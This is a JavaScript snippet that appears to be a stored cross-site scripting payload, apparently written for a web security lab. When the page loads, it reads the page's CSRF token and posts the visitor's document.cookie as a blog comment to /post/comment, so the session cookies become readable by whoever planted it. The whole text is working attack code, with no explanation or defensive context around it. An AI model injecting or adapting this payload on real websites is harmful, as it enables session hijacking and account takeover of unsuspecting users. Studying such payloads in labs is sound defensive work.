<script>
    window.addEventListener('DOMContentLoaded', function () {
        try {
            // Extract CSRF token from a hidden input
            var token = document.getElementsByName('csrf')[0].value;

            // Create form data
            var data = new FormData();
            data.append('csrf', token);
            data.append('postId', 8);
            data.append('comment', document.cookie); // For example purposes
            data.append('name', 'victim'); // Static name (can be dynamic)
            data.append('email', 'attacker@gmail.com');
            data.append('website', 'https://www.google.com');

            // Send POST request
            fetch('/post/comment', {
                method: 'POST',
                credentials: 'include', // Include cookies
                body: data
            });
        } catch (e) {
            console.error('Error during request:', e);
        }
    });
</script>
